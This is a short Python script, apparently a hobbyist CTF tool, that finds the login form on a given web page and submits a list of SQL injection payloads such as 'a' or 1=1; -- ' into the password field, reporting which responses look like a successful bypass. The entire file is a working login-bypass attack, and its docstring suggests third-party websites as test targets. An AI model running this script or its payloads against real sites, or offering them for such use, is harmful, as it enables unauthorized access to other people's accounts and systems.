__author__ = 'matt piazza'
'''
a super simple script to blind-fuzz / sql inject your way into a website
pass in a URL that points to a page with a login form
and optionally pass in a session cookie in the form 'cookiename=value'
example: python ./sqlpy.py ringzer0team.com/challenges/1 PHPSESSID=4pficqbcqbit3kbq22en1edjg6

but why would you need to sqli into something if you already have a session? idk ctfs?

simple & easy URLs for testing:
http://friend-demo.herokuapp.com/interactive-form/
http://s3.cssflow.com/snippets/8-login-form/index.html
'''

import sys          #command-line args
import requests     #GETing pages; POSTing special usernames and passwds
import bs4          #finding the login form from the given URL

badwords = ["a' or 1=1; -- ", "a' or 'a'='a", "a' /*!or*/ 1=1; -- ", "a' /*!or*/ 'a'='a"]
test_input = "'"  # single quote to look for obvious errors

def main(url):
    if not url.startswith('http'):
        url = 'http://'+url
    page = requests.get(url)
    soup = bs4.BeautifulSoup(page.text)
    forms = soup.find_all('form')
    orig_pagetitle = soup.title
    # optionally print page title
    # print('title: ' + orig_pagetitle if orig_pagetitle is not None else 'no title')
    #
    print('found '+ str(len(forms)) +' forms')
    if len(forms)!=1:
        # for form in forms:
        # determine which form on the page is the login form
        print('sorry, at this time slqpy only handles pages with one form ;)')

    # hack ahead:
    form = forms[0]
    # #
    method = form.get('method')
    submit = form.get('action')
    if '//' not in submit:
        # relative path
        submit = url + submit
    # verbosely print form action
    # print('form points to ' + submit)
    #
    inputs = form.find_all('input')
    passparm, userparm = '', ''
    hiddens = dict()
    for input in inputs:
        name = input.get('name')
        type = input.get('type')
        if name is not None and type is not None:
            # optionally print form info for debugging
            # print(name + '\t==>\t' + type)
            #
            if ('name' in name or 'user' in name or 'in' in name) and type != 'password':
                userparm = name
            elif type == 'password' or 'pass' in name:
                passparm = name
            elif type == 'hidden':
                hiddens[name] = input.get('value')
    # optionally print form info for debugging
    # print('the username parm is ' + userparm + ' and the password is called ' + passparm)
    # print('hidden fields: ' + str(hiddens))
    #

    for evil in badwords:
        print()
        # only put exploits in the password field for now
        postbody = {userparm:'unregistered', passparm:evil}
        if len(hiddens) >= 1:
            # great hack to add two dictionaries :/
            postbody = dict(list(postbody.items()) + list(hiddens.items()))

        if method in ['post','POST']:
            response = requests.post(submit, postbody)
        elif method in ['get', 'GET']:
            response = requests.get(submit, postbody)
        else:
            print('unknown form action method: ' + method + '. dying')
            sys.exit(1)
        status = response.status_code
        print('got response ' + str(status) + ' with \'' + evil + '\'')
        page = response.text
        if status in [403, 401, 406]:
            print('\tfailed [' + str(status) + '] to log in with \'' + evil +'\'. continuing...')
            if status == 406:
                print('\t\tintrusion may have been detected; we have to go deeper. more obfuscation.')
            continue
        elif status >= 400:
            print('\tless-expected failure [' + str(status) + '] with \'' + evil + '\'. continuing...')
            continue
        elif status == 200:
            responsesoup = bs4.BeautifulSoup(response.text)
            new_pagetitle = responsesoup.title
            badlogin = 'failed' in page or 'incorrect' in page
            if badlogin:
                print('\t\'' + evil + '\' seems to have been foiled – login failed')
                print('\tcontinuing...')
                continue
            elif new_pagetitle == orig_pagetitle:
                print('\twe may have been sent back to the login page in response to\n'
                      '\ta failed login. check these headers:\n\t' + str(response.headers))

                # input() fails for some reason, continue by default for now
                cont = 'y'
                if cont in 'Yy':
                    continue
                elif cont in 'Nn':
                    sys.exit(0)
            else:
                print('\tsmells like success, is there a session cookie in here\n\t' + str(response.headers))
        elif status > 200 and status < 400:
            print('\tunknown status code [' + status + ']. continuing')


def usage():
    print("please pass in at least one command-line arg\n"+
          "<python sqlpy.py google.com/login [SESSIONID=45]>")


if __name__ == "__main__":
    print(sys.argv)
    if len(sys.argv)<2:
        usage()
    else:
        main(sys.argv[1])